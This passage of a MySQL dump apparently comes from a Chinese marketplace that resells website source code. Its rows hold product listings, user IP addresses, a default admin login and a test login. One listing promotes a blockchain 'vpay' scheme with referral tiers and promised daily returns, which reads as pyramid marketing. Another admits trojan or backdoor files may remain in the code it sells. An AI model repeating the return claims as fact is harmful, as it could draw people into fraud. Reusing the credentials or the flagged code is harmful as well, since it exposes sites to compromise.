(46, '1554036529-15', '2019-06-19 16:42:47', NULL, NULL, '219.157.183.249', 15, 969, 600, '1560933767030', 1, '整站带数据网络工作室个人博客资源下载商城系统源码自适应手机', 'wait', NULL, NULL, NULL, NULL, '', '', '', 0, 1, NULL, NULL, '', 0, '', NULL, NULL, NULL, NULL),
(47, '1554034828-15', '2019-06-21 16:10:27', NULL, NULL, '119.130.215.237', 15, 974, 100, '1561104627064', 1, '新站网，友价源码商城带数据打包出售3月份打包的', 'wait', NULL, NULL, NULL, NULL, '', '红色 中码', '', 68, 1, NULL, NULL, '', 0, '', NULL, NULL, NULL, NULL);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_orderlog`
--

CREATE TABLE IF NOT EXISTS `yjcode_orderlog` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `orderbh` char(50) DEFAULT NULL,
  `userid` int(10) DEFAULT NULL,
  `selluserid` int(10) DEFAULT NULL,
  `admin` int(10) DEFAULT NULL,
  `txt` text,
  `sj` datetime DEFAULT NULL,
  `fj` varchar(250) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=5 ;

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_paykami`
--

CREATE TABLE IF NOT EXISTS `yjcode_paykami` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `ka` varchar(220) DEFAULT NULL,
  `mi` text,
  `money1` float DEFAULT NULL,
  `userid` int(10) DEFAULT NULL,
  `ifok` int(10) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `usesj` datetime DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=5 ;

--
-- 转存表中的数据 `yjcode_paykami`
--

INSERT INTO `yjcode_paykami` (`id`, `ka`, `mi`, `money1`, `userid`, `ifok`, `sj`, `usesj`) VALUES
(1, 'AAAAA', 'BBBBB', 50, 39, 1, '2017-05-01 03:52:19', '2017-05-01 03:58:37'),
(2, 'AAAAA', 'BBBBB', 50, 0, 0, '2017-05-01 03:52:21', NULL),
(3, 'AAAAA', 'BBBBB', 100, 0, 0, '2017-05-01 03:52:26', NULL),
(4, 'AAAAA', 'BBBBB', 200, 0, 0, '2017-05-01 03:52:34', NULL);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_payreng`
--

CREATE TABLE IF NOT EXISTS `yjcode_payreng` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `money1` float DEFAULT NULL,
  `type1` int(10) DEFAULT NULL,
  `userid` int(10) DEFAULT NULL,
  `ddbh` varchar(100) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `ifok` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=2 ;

--
-- 转存表中的数据 `yjcode_payreng`
--

INSERT INTO `yjcode_payreng` (`id`, `money1`, `type1`, `userid`, `ddbh`, `sj`, `ifok`) VALUES
(1, 1, 1, 14, '20180128200040011100210004976919', '2018-01-28 19:22:39', 1);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_pro`
--

CREATE TABLE IF NOT EXISTS `yjcode_pro` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `bh` char(50) DEFAULT NULL,
  `mybh` char(50) DEFAULT NULL,
  `userid` int(11) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `lastsj` datetime DEFAULT NULL,
  `uip` char(50) DEFAULT NULL,
  `ty1id` int(11) DEFAULT NULL,
  `ty2id` int(11) DEFAULT NULL,
  `ty3id` int(11) DEFAULT NULL,
  `zt` int(11) DEFAULT NULL,
  `tysx` varchar(250) DEFAULT NULL,
  `tit` varchar(250) DEFAULT NULL,
  `txt` longtext,
  `djl` int(11) DEFAULT NULL,
  `xsnum` int(11) DEFAULT NULL,
  `kcnum` int(11) DEFAULT NULL,
  `money1` float DEFAULT NULL,
  `money2` float DEFAULT NULL,
  `money3` float DEFAULT NULL,
  `yhxs` int(11) DEFAULT NULL,
  `yhsm` char(50) DEFAULT NULL,
  `yhsj1` datetime DEFAULT NULL,
  `yhsj2` datetime DEFAULT NULL,
  `ifxj` int(11) DEFAULT NULL,
  `iftuan` int(11) DEFAULT NULL,
  `pf1` float DEFAULT NULL,
  `pf2` float DEFAULT NULL,
  `pf3` float DEFAULT NULL,
  `iftj` int(11) DEFAULT NULL,
  `fhxs` int(11) DEFAULT NULL,
  `wpurl` varchar(250) DEFAULT NULL,
  `wppwd` char(50) DEFAULT NULL,
  `upf` varchar(250) DEFAULT NULL,
  `ysweb` varchar(250) DEFAULT NULL,
  `yysweb` varchar(50) DEFAULT NULL,
  `wdes` varchar(250) DEFAULT NULL,
  `wkey` varchar(250) DEFAULT NULL,
  `wppwd1` varchar(200) DEFAULT NULL,
  `ifuserdj` int(10) DEFAULT NULL,
  `ty4id` int(10) DEFAULT NULL,
  `ty5id` int(10) DEFAULT NULL,
  `ztsm` varchar(230) DEFAULT NULL,
  `txtmb` char(10) DEFAULT NULL,
  `myty1id` int(10) DEFAULT NULL,
  `myty2id` int(10) DEFAULT NULL,
  `zl` float DEFAULT NULL,
  `ysarea` text,
  `upty` int(10) DEFAULT NULL,
  `downurl` varchar(250) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=266 ;

--
-- 转存表中的数据 `yjcode_pro`
--

INSERT INTO `yjcode_pro` (`id`, `bh`, `mybh`, `userid`, `sj`, `lastsj`, `uip`, `ty1id`, `ty2id`, `ty3id`, `zt`, `tysx`, `tit`, `txt`, `djl`, `xsnum`, `kcnum`, `money1`, `money2`, `money3`, `yhxs`, `yhsm`, `yhsj1`, `yhsj2`, `ifxj`, `iftuan`, `pf1`, `pf2`, `pf3`, `iftj`, `fhxs`, `wpurl`, `wppwd`, `upf`, `ysweb`, `yysweb`, `wdes`, `wkey`, `wppwd1`, `ifuserdj`, `ty4id`, `ty5id`, `ztsm`, `txtmb`, `myty1id`, `myty2id`, `zl`, `ysarea`, `upty`, `downurl`) VALUES
(184, '1554034828-15', '', 15, '2019-03-31 20:20:28', '2019-06-21 16:10:27', '223.74.105.155', 37, 40, 0, 0, 'xcf18xcf20xcf24xcf27xcf', '新站网，友价源码商城带数据打包出售3月份打包的', '<p>1，程序是友价核心<br/><br/><br/>2 目前打包下来的，指的是我建设好的测试网址为准，程序有带数据，<br/>3，如果安装以后发现有，小漏洞，我作为站长卖家，无法为你修复，所以买之前先测试，功能与测试网址为准，<br/>4，卖家可以为你首次安装好，不提供任何售后服务，和代码修改，和后期没有任何更新服<br/><br/>5，一旦发货，不接受任何理由退货，有问题提前咨询卖家和测试，<br/><br/><br/><img src="/querylist/img/2019-03-31/201903310828349146.png"/><br/></p>', 249, 11, 9989, 400, 400, 400, 2, '3月份打包的', '2019-03-31 20:52:08', '2019-12-01 20:52:09', 0, 1, 5, 5, 5, 0, 1, '', '', NULL, '', NULL, '新站网，友价源码商城带数据打包出售3月份打包的', '新站网，友价源码商城带数据打包出售3月份打包的', '', 0, 0, 0, '', '', 0, 0, 0, NULL, 0, ''),
(185, '1554035421-15', '', 15, '2019-03-31 20:30:21', '2019-03-31 20:30:37', '223.74.105.155', 37, 41, 0, 0, 'xcf18xcf20xcf24xcf27xcf', '软件销售宝，好友宝，微商软件销售商城系统，支持发送激活码免签约及时到账收款', '<p>软件销售宝，微商软件销售商城系统，支持发送激活码免签约及时到账收款接口<br/>程序所有功能已测试网址为准，这是一款针对微商朋友，准备的一款网站商城销售系统，<br/>主要用于，激活码，卡密发货，<br/>程序大小包含，图片，3.1G<br/>需要测试网址，联系客服，<br/>首次购买卖家包含安装 <br/>安装以后，后期不负责修改代码和，售后服务，<br/><br/><br/>网站建设完成以后，代码到手以后不得申请退款，不接受任何理由退款，<br/><br/><br/>程序只包含图片文章信息，不包含会员信息，数据，比如会员注册的账号信息不提供，<br/><br/><br/><br/><br/><img src="/querylist/img/2019-03-31/201903310830245289.png"/><br/><img src="/querylist/img/2019-03-31/201903310830244929.png"/><br/><img src="/querylist/img/2019-03-31/201903310830253472.png"/><br/><img src="/querylist/img/2019-03-31/201903310830256945.png"/><br/><img src="/querylist/img/2019-03-31/201903310830263073.png"/><br/><img src="/querylist/img/2019-03-31/201903310830266911.png"/><br/><img src="/querylist/img/2019-03-31/201903310830264872.png"/><br/><img src="/querylist/img/2019-03-31/201903310830277871.png"/><br/><img src="/querylist/img/2019-03-31/201903310830279488.png"/><br/></p>', 117, 0, 10000, 6000, 6000, 6000, 2, '软件销售宝，好友宝', '2019-03-31 20:53:05', '2019-12-31 20:53:08', 0, 1, 5, 5, 5, 0, 1, '', '', NULL, '', NULL, '软件销售宝，好友宝，微商软件销售商城系统，支持发送激活码免签约及时到账收款', '软件销售宝，好友宝，微商软件销售商城系统，支持发送激活码免签约及时到账收款', '', 0, 0, 0, '', '', 0, 0, 0, NULL, 0, ''),
(186, '1554035461-15', '', 15, '2019-03-31 20:31:01', '2019-03-31 20:31:22', '223.74.105.155', 37, 40, 0, 0, 'xcf18xcf20xcf24xcf27xcf', '站长网二次开发整站打包出售带数据带采集功能', '站长网本人居然说我是个骗子，请看下面截图文件源代码，或者打开测试网址看看，看我是否真的有他网站的源代码，<br>程序是友价核心开发的，站长网二次开发本店不能保证，程序，完整无漏洞<br>第二，由于我这个是打包下来的，跟不上站长网天天更新的节奏，所以我也不可能天天去打包，的，<br>第三，目前打包下来的，指的是我建设好的测试网址为准，程序有带数据，但是没有下载连接，有部分图片没有<br>第四，如果安装以后发现有，小漏洞，我作为站长卖家，无法为你修复，所以买之前先测试，功能与测试网址为准，<br>第五，卖家可以为你首次安装好，不提供任何售后服务，和代码修改，和后期没有任何更新服<br>务，第六，一旦发货，不接受任何理由退货，有问题提前咨询卖家和测试，<br><br><br>前端测试账号，1038756959 密码，1038756959<br><font color=''#ff0000''><b>通过软件扫描图片木马等文件全部被删除，下面剩下的就是这些，如果你认定这些是木马后门，请不要拍</b></font>，<font color=''#ff0000''><b>代码到手以后请自己重新查一遍，如果有不安全的文件存在请直接删除，不要来找我申请退款，我再次说明</b></font>，<br><img src=''/querylist/img/2019-03-31/201903310831115647.png''/><br><br><br><img src=''/querylist/img/2019-03-31/201903310831129561.png''/><br><img src=''/querylist/img/2019-03-31/201903310831121668.png''/><br><img src=''/querylist/img/2019-03-31/201903310831139285.png''/><br><img src=''/querylist/img/2019-03-31/201903310831139202.png''/><br><img src=''/querylist/img/2019-03-31/201903310831138707.png''/><br><img src=''/querylist/img/2019-03-31/201903310831144499.png''/><br><img src=''/querylist/img/2019-03-31/201903310831140677.png''/><br>', 105, 0, 10000, 500, 500, 0, 1, '', NULL, NULL, 0, NULL, 5, 5, 5, 0, 1, '', '', NULL, 'http://t.cn/Efn0Nmk', NULL, '站长网二次开发整站打包出售带数据带采集功能', '站长网二次开发整站打包出售带数据带采集功能', '', 0, 0, 0, NULL, '', 0, 0, 0, NULL, 0, ''),
(188, '1554035525-15', '', 15, '2019-03-31 20:32:05', '2019-03-31 20:32:20', '223.74.105.155', 37, 98, 0, 0, 'xcf12xcf20xcf24xcf27xcf', 'vpay源码vpay区块链商城系统激活卡版区块链钱包交易所系统', '<font color=''#ff0000''>程序原价12000 ，小白，请不要随便拍，程序卖给会使用懂技术的人，<br></font><br><font color=''#ff0000''>不懂得就不要随便拍，因为不提供任何指导使用服务,以上价格没有包含任何服务，</font><br><font color=''#ff0000''>如果需要服务，提前联系卖家</font><br><font color=''#ff0000''>所有功能以测试网址为准</font><br>一、vpay的核心：<br>基于区链块分布式智能合约技术，实现货币的去中心化、点对点无损无痕流通，让流通产生价值，让快速流通增加哈希算力，最终加速价值的释放。<br>名词释意：<br>【余额】：法定货币现金，也可以称之为现金币，简称钱。<br>【积分】：余额流通（转出、支付）一次，速通宝系统会赠送的积分，积分是余额流通产生的价值。<br>【转出】：余额在两个账户或者多个账户之间的流通<br>【转入】：收款（生成二维码）<br>【买入】：在线挂单求购余额<br>【卖出】：在线挂单出售余额<br>【速通宝资产】：基于区链块技术，OPEN COIN开源算法开发的数字加密货币，运用此算法的数字加密货币还有谷歌公司投资的瑞波币。速通宝资产总发行量3.65亿，首发1000万，剩余3.55亿由速通宝持有者通过流通增加算力挖取。<br>分享】：分享链接或二维码，推广给其他用户使用。通过分享，被分享者在使用速通宝的过程能加速分享者的积分释放速度。使用规则；<br>【转出规则】：通过“转账”或“扫码支付”，转账方转出多少余额就收多少余额就收多少现金，同时获得的积分，收款方需支付相应的现金给转账方，收款方获得转账额80%余额和20%的积分，如转账方是首次转账给收款方则速通宝系统会另赠送20%的积分给收款方。如：A转账给B→10000余额，那么B支付10000的现金给A，A得到10000的现金和10000的积分，B得到8000余额和2000的积分，如A是首次转账给B，那么系统另外获赠2000积分。<br>【收款规则】：同上 【买入规则】：为确保线上交易诚信，创建充值订单需扣除100的保证金，交易完成后，保证金自动退还账户。<br>【卖出规则】：自由，无限制，挂单卖出后得到85%的现金，系统不在赠送积分。<br>【加速释放规则】：用户积分按2%的速度释放积分到余额，在用户不断分享其他用户使用速通宝的情况下，其他用户的转账流通额度和速度可加速其积分释放速度，用户积分释放的速度将有可能是10%、20%、50%、。<br>【会员级别规则】：用户免费注册，注册成功为普通用户，分享用户后可加速积分释放，当普通用户积分账户满100万时，自动升级“VIP会员”<br>【VIP会员】：享受15代余额流通的8%加入到积分账户。<br>二、Vpay的八大优势：<br>1.拆分（原始发行1000万）2.**（买进卖出点对点匹配打款）3.分红（每天2%释放）4.复利（放大倍增）5.虚拟币（区块链挖矿机制）6.数字资产（低进高出炒币）7.资产证券化（释放完再复投）8.消费返利（落地商家扫码支付）<br>拥有1万积分=日薪20左右 月薪600左右 年薪7200<br>拥有5万积分=日薪100左右 月薪3000左右 年薪3.6万<br>拥有10万积分=日薪200左右 月薪6000左右 年薪7.2万<br>拥有50万积分=日薪1000左右 月薪3万左右 年薪36万<br>拥有100万积分=日薪2000左右 月薪6万左右 年薪72万<br>拥有500万积分=日薪1万左右 月薪30万左右 年薪360万<br>拥有1000万积分=日薪2万左右 月薪60万左右 年薪720万<br>拥有5000万积分=日薪10万左右 月薪300万左右 年薪3600万<br>您的定位是多少呢？<br>行动是解决一切问题的基础，行动派最可爱 ！<br>亲爱的速通宝家人们选择大于努力！！！<br>不推广一个人，关于收益问题，我给大家做一个分析！<br>以20000配套为例 ：<br>投米20000 ，获得120000积分 每天释放分红240，5天提现一次，一月6次 一次收益为：240×5＝1200，提现1000 提现扣除15%手续费，实际获利850 一月获利：850×6＝5100 <br><br><br><img src=''/querylist/img/2019-03-31/201903310832083049.png''/><br><img src=''/querylist/img/2019-03-31/201903310832084848.png''/><br><img src=''/querylist/img/2019-03-31/201903310832097738.png''/><br><img src=''/querylist/img/2019-03-31/201903310832097814.png''/><br><img src=''/querylist/img/2019-03-31/201903310832098585.png''/><br><img src=''/querylist/img/2019-03-31/201903310832106359.png''/><br><img src=''/querylist/img/2019-03-31/201903310832102537.png''/><br><img src=''/querylist/img/2019-03-31/201903310832117434.png''/><br><img src=''/querylist/img/2019-03-31/201903310832118829.png''/><br>', 115, 0, 10000, 520, 520, 0, 1, '', NULL, NULL, 0, NULL, 5, 5, 5, 0, 1, '', '', NULL, '', NULL, 'vpay源码vpay区块链商城系统激活卡版区块链钱包交易所系统', 'vpay源码vpay区块链商城系统激活卡版区块链钱包交易所系统', '', 0, 0, 0, NULL, '', 0, 0, 0, NULL, 0, ''),
(189, '1554035561-15', '', 15, '2019-03-31 20:32:41', '2019-05-13 15:42:24', '223.74.105.155', 37, 42, 0, 0, 'xcf12xcf20xcf24xcf29xcf', '多城市房产程序 开源房产源码Thinkphp多城市版站群版', '<p>懂开发的就购买，不懂的不建议购买，本套程序不提供技术服务 不提供技术服务 重要的事说两遍 &nbsp;小白勿拍。<br/>看演示看后台联系客服<br/>多城市版站群版多站点房产网站源码房地产网站，Thinkphp5多城市房产系统开源源码带房产系统数据字典、安装说明<br/>以上价格是包安装，请买家提供域名服务器<br/><br/><br/><img src="/querylist/img/2019-03-31/201903310832452853.png"/><br/><img src="/querylist/img/2019-03-31/201903310832451356.png"/><br/><img src="/querylist/img/2019-03-31/201903310832463464.png"/><br/><img src="/querylist/img/2019-03-31/201903310832475586.png"/><br/><img src="/querylist/img/2019-03-31/201903310832477841.png"/><br/></p>', 121, 1, 9999, 150, 150, 0, 1, '', NULL, NULL, 0, 0, 5, 5, 5, 88, 1, '', '', NULL, 'http://t.cn/E2i7xUL', NULL, '多城市房产程序 开源房产源码Thinkphp多城市版站群版', '多城市房产程序 开源房产源码Thinkphp多城市版站群版', '', 0, 0, 0, '', '', 0, 0, 0, NULL, 0, ''),
(190, '1554035586-15', '', 15, '2019-03-31 20:33:06', '2019-03-31 20:33:15', '223.74.105.155', 37, 40, 0, 0, 'xcf18xcf20xcf24xcf29xcf', '友价房产模板友价模板房产门户系统 房产源码模板同步更新', ' 友价房产模板 友价模板 友价T601模板 房产门户系统 房产源码模板<br>系统目前本  程序标配一个模板 <br>程序免费提供安装一次 后期需要安装收费  程序使用操作不提供不提供修改代码内容 如果需要提供服务指导，联系卖家<br><br><br>以上价格提供三次免费更新  三次更新完以后，收费，更新<br><br><br><img src=''/querylist/img/2019-03-31/201903310833109523.png''/><br>', 79, 0, 10000, 600, 600, 0, 1, '', NULL, NULL, 0, NULL, 5, 5, 5, 0, 1, '', '', NULL, 'http://t.cn/Rdi294p', NULL, '友价房产模板友价模板房产门户系统 房产源码模板同步更新', '友价房产模板友价模板房产门户系统 房产源码模板同步更新', '', 0, 0, 0, NULL, '', 0, 0, 0, NULL, 0, ''),
(191, '1554035608-15', '', 15, '2019-03-31 20:33:28', '2019-03-31 20:33:37', '223.74.105.155', 37, 42, 0, 0, 'xcf8xcf20xcf24xcf29xcf', '微信群二维码，公众号源码货源，微信群二维码导航+签到+手机版', '微信群二维码，公众号源码货源，微信群二维码导航+签到+手机版<br>安装方法，把程序上传在网站根目录  域名访问加/e/install/index.php 跳远安装页面，输入数据库账号密码，<br>后台地址为，域名访问加  /e/7cadmintea  账号 admin 密码为，admin888<br>找到数据备份，恢复，恢复数据，更新所有缓存即可，<br>手机端，m 目录， 手机端，安装方法，手工修改，文件，/m/e/config/config.php   修改数据库账号密码，同步PC端数据<br>然后创建子网站，绑定目录，m 服务器不限制虚拟主机，必须支持创建子网站，<br><br><br><br><br><font color=''#ff0000'' size=''4''>下面给大家介绍一个功能，更高一点的版本，测试网址，http://10.aimeip.com  价格是400元，需要该版本的联系客服改价格</font><br><br><br><img src=''/querylist/img/2019-03-31/201903310833313761.png''/><br><img src=''/querylist/img/2019-03-31/201903310833326134.png''/><br><img src=''/querylist/img/2019-03-31/201903310833322494.png''/><br><img src=''/querylist/img/2019-03-31/201903310833329054.png''/><br><img src=''/querylist/img/2019-03-31/201903310833335168.png''/><br>', 77, 0, 10000, 200, 200, 0, 1, '', NULL, NULL, 0, NULL, 5, 5, 5, 0, 1, '', '', NULL, 'http://t.cn/E28RKqy', NULL, '微信群二维码，公众号源码货源，微信群二维码导航+签到+手机版', '微信群二维码，公众号源码货源，微信群二维码导航+签到+手机版', '', 0, 0, 0, NULL, '', 0, 0, 0, NULL, 0, ''),
(192, '1554035630-15', '', 15, '2019-03-31 20:33:50', '2019-03-31 20:34:03', '223.74.105.155', 37, 42, 0, 0, 'xcf8xcf20xcf24xcf31xcf', '升级版微信群二维码导航源码公众号小程序推广源码微信推广平台整合微信支付', '<br><br>1、本店出售的源码均严格测试，购买前请先联系店主提供测试或者咨询清楚再购买！<br><br>商品拍下后一律通过网络传输，由于是网络虚拟产品，源代码具有可复制性，故程序售出后不予退款。<br>2、我们不提供售后的相关咨询和售后技术支持。<br>3、源码出售和程序修改是两个业务，此价为源码价，不包括任何修改，由于源码技术性较高，<br>如果买家确实需要帮助，我们可以提供有偿技术服务，收费视复杂程度具体而定。<br>4、源码附带有安装说明，请参照安装说明安装。若需要小店提供安装服务的亲另谈具体服务费用。<br>5、亲们注意了，没有任何建站基础，介意上述说明的请慎拍！<br>6、如果你没有任何建站基础，我们可以提供一条龙服务，包括域名、空间安装等服务。具体费用详谈！<br>7、我们卖的都是整站程序，不是单一的网站模版，直接按照安装说明安装好就可以使用。<br>8、我们的演示均是自己的演示，不要和低价源码相比，很多低价源码都是用的别人的演示。<br><font color='' size=''>9、所有功能以测试网站为准 测试网站有的功能给你们的也是一样</font><br><font color=''#ff0000''><br></font><br><font color=''#ff0000''>效果截图某些情况不能完整的看到效果，特别是功能方面无法能真正的体验到，</font><br><font color=''#ff0000''>我们为了用户在购买前能体验到网站的实际效果和功能，我们90%以上的程序都自己做了演示站。</font><br><font color=''#ff0000''>希望亲们看了演示再做决定是否购买，源码具有可复制性，所以，</font><br><font color=''#ff0000''>一经卖出就不提供退款。希望朋友你能理解掌柜的不易！谢谢合作！</font><br><font color=''#ff0000''><br></font><br><font color=''#ff0000''>虚拟空间推荐，地址，https://www.90qh.com/tui_54576.html</font><br><font color=''#ff0000''>云服务器推荐，地址，http://cloud.tencent.com/redirect.php?redirect=1005&amp;cps_key=ae0cbf12e817248e85013e4abaf28cfb</font><br><font color=''><br></font><br><font color=''#ff0000'' size=''7''>以上价格包含安装</font><br>程序是免费安装 只管安装<br>程序不包含修改，任何内容，外连, 代码，版权 和售后服务<br>需要安装，或者修改，以上内容代码等服务,收费处理<br>程序只卖给需要的人，懂技术的人，小白用户，不要随便拍，<br>发货以后不能退款,再次声明，以上不提供任何售后服务<br>不管你是新手还是老司机遇到任何问题都不要说是程序问题<br>程序所有功能已测试网址为准，先测试 不懂的提前咨询<br>虚拟主机用户，必须支持创建子网站 服务器不限制<br><br><br><font color=''#ff0000''><br></font><br><font color=''#ff0000''>1、这源码完整吗？可用吗？</font><br><font color=''#ff0000''>每一套源码都是自己本地搭建、测试、修改和调试，源码保证无误，已经设置好栏目，调用好数据，带有演示数据库了。后期，您只需再更新你自己的内容就可以了。</font><br><font color=''#ff0000''>2、这源码是什么程序的？功能有没有限制？</font><br><font color=''#ff0000''>所有源码都开源CMS内核搭建，属于仿站性质，网站功能上不会有任何限制或是所谓的后门程序，你所运的都是织梦官方开源程序，请放心购买。</font><br><font color=''#ff0000''>3、网站改起来会麻烦，不懂怎么用？</font><br><font color=''#ff0000''>您根据我们的安装说明安装好之后，在网站后台修改相关的信息，然后把LOGO和相关替换成你的就行了。</font><br><font color=''#ff0000''>4、为何我上传后无法安装？或者安装后无法更新？</font><br><font color=''#ff0000''>这是你空间函数没有相应配置或没有给予写入权限，特别是淘宝购买的某些垃圾空间根本不能很好的运行程序，</font><br><font color=''#ff0000''>请不要再怀疑我源码是否有问题或者不能用了，更不会因为这个问题再做老好人给你退款了。</font><br><font color=''#ff0000''>购买空间之前，请询问空间商是否支持你购买的这套程序，正规空间一般都是没有问题的。</font><br><font color=''#ff0000''>5、源码可以便宜点吗？少点就买了。</font><br><font color=''#ff0000''>所有源码，都是实际价格，每套源码都是花了时间和精力才推出来，并且测试均无错误，所以我更加需要将更多的时间和精力服务好“识货”的你。</font><br><br><br><br><br><br><br><br><br>微信二维码导航源码公众号推广发布平台货源微信群源码小程序推广平台带手机版！整合微信登陆，QQ登陆，整合多重支付方式，修复存在的BUG问题！<br>2019年1月修复如下：<br>1、界面全新改版。<br>2、新增微信扫码支付、支付宝支付.<br>3、新增微信登陆、QQ登录<br>4、新增推广送积分<br>5、升级到帝国7.5系统<br>6、修复地区微信多刷新几次就出现乱码的问题<br>6、新增微信群、货源、小程序、营销的搜索<br>7、新增手机版微信群、货源、小程序、营销的搜索<br>8、新增百度自助推广功能<br>9、升级到帝国7.5内核<br>10、修复微信登陆、QQ登陆功能<br>这个商城里面的这款程序都来自我们工作室，不信你可以看他们的演示，底部都有酷讯网络工作室，都是不懂技术倒卖我的产品！~如果遇到问题根本就给你解决不了！<br>最基本的，倒卖的根本不知道发布一条需要多少费用在什么地方修改。<br>运行介绍：需搭建PHP+MYSQL环境，支持帝国CMS网站系统运行，需要支持伪静态！<br>程序说明：程序采用帝国CMS开发，微信二维码导航源码微信群公众号推广发布平台源码带手机版送教程帝国内核。程序可以用来做微信群导航平台，微信二维码推广平台等。<br>有一个很不错的功能：会员可以自助推广自己的公众号，微信群，微信号，小程序推广就显示在首页，到期自动下架。如果要实现会员充值即时到账，需要有企业支付宝申请即时到账或者用一些支付宝免签软件。<br>关于微信登陆，需要在https://open.weixin.qq.com 申请网站应用，应用官网和授权回调域填你的网址比如：把里面的网址修改成你的网址。更多注意的地方我们都有教程，市场上同款产品比较多，仔细对比就知道源码的发源地！<br>程序安装：如果是虚拟主机需要支持绑定子目录，建议使用我们的快云VPS服务器，管里方便，安装快捷，安全稳定！<br><br>需要测试的联系客服提供！<br><br><br><img src=''/querylist/img/2019-03-31/201903310833540465.png''/><br>', 86, 0, 10000, 280, 280, 0, 1, '', NULL, NULL, 0, NULL, 5, 5, 5, 0, 1, '', '', NULL, '', NULL, '升级版微信群二维码导航源码公众号小程序推广源码微信推广平台整合微信支付', '升级版微信群二维码导航源码公众号小程序推广源码微信推广平台整合微信支付', '', 0, 0, 0, NULL, '', 0, 0, 0, NULL, 0, ''),
(193, '1554035671-15', '', 15, '2019-03-31 20:34:31', '2019-03-31 20:34:39', '223.74.105.155', 37, 98, 0, 0, 'xcf18xcf20xcf24xcf29xcf', '友价域名交易系统一淘模板', '<font size='' color=''>1、本源码包安装包升级  由于源码的可复制性 不接受退款和中差评 </font><br><font size='' color=''>2、拿到源码不会调试安装 就说我们源码不完整 申请退款请不要拍</font><br><font size='' color=''>3、故意说源码不完整，代码到手 立即恶意申请退款的 也请不要拍</font><br><font size='' color=''>4、诚信开店 老实做人 骗子走开 同行勿扰 源码只出售给  需要的人</font><br><font size='' color=''>5、所有功能以测试网站为准  ,测试网站有的功能给你们的也是一样</font><br><br><br><br><br>PHP+MYSQL，支持拍卖功能，自动获取验证域名信息<br>支持拍卖、一口价、议价功能，自动获取验证域名信息，<br>仿淘宝式交易流程，发布域名支持批量发布。老用户尊享优质售后服务，<br>后续围绕该源码上线的手机版，老用户均免费配置。<br><br><br><br><br><br><br><br><br>在此说明虚拟产品，不支持，退款 卖的是整个程序，源代码<br> 在此说明，以上价格150块，源代码，不提供任何售后服务，<br>发货不包含物流邮寄，都是采用，网络下载地址，百度网，或者qq传输，<br>本软件没有申请知识产权专利，请不要购买收到货以后，因为个人原因想尽办法退款，<br>找理由说本店是盗版，不是正版，没有在线升级更新，<br>提前说明不做任何更新服务和指导，只负责发送源代码，这是网址为准，http://ym.928vip.cn/ 请先测试，<br>想拿到代码，就退款的人千万不要拍，发送源代码以后不允许任何理由退款<br>需要了解更多详细和测试功能，请联系卖家<br><br>有疑问请联系卖家，先咨询了解清楚<br><br><br>', 74, 0, 10000, 150, 150, 0, 1, '', NULL, NULL, 0, NULL, 5, 5, 5, 0, 1, '', '', NULL, 'http://t.cn/RHQ9moA', NULL, '友价域名交易系统源码商城', '友价域名交易系统源码商城', '', 0, 0, 0, NULL, '', 0, 0, 0, NULL, 0, ''),
(194, '1554035774-15', '', 15, '2019-03-31 20:36:14', '2019-03-31 20:36:37', '223.74.105.155', 37, 98, 0, 0, 'xcf12xcf20xcf24xcf27xcf', '卡密系统正版多用户企业版虚拟在线全自动发货服务采用ThinkPHP5框架开发', '发卡系统正版多用户企业版虚拟在线全自动发货服务采用ThinkPHP5框架开发<br>采用，ThinkPHP5框架开发   速度比之前的，提升两倍，<br><br><br><br>卡密店铺地址，http://k.163aas.com/shop/5bf7f19ed3a71.html<br>卡密产品测试地址，http://k.163aas.com/shop/5c347435931e1.html<br><br><br>手机电脑自动适应，默认模板，<br><br><br><img src=''/querylist/img/2019-03-31/201903310836209310.png''/><br><img src=''/querylist/img/2019-03-31/201903310836214117.png''/><br><img src=''/querylist/img/2019-03-31/201903310836214515.png''/><br><img src=''/querylist/img/2019-03-31/201903310836226654.png''/><br><img src=''/querylist/img/2019-03-31/201903310836233017.png''/><br><img src=''/querylist/img/2019-03-31/201903310836234578.png''/><br><img src=''/querylist/img/2019-03-31/201903310836244856.png''/><br><img src=''/querylist/img/2019-03-31/201903310836245435.png''/><br><img src=''/querylist/img/2019-03-31/201903310836251513.png''/><br>', 77, 0, 10000, 2000, 2000, 0, 1, '', NULL, NULL, 0, NULL, 5, 5, 5, 0, 1, '', '', NULL, 'http://t.cn/ELwRrEP', NULL, '卡密系统正版多用户企业版虚拟在线全自动发货服务采用ThinkPHP5框架开发', '卡密系统正版多用户企业版虚拟在线全自动发货服务采用ThinkPHP5框架开发', '', 0, 0, 0, NULL, '', 0, 0, 0, NULL, 0, ''),
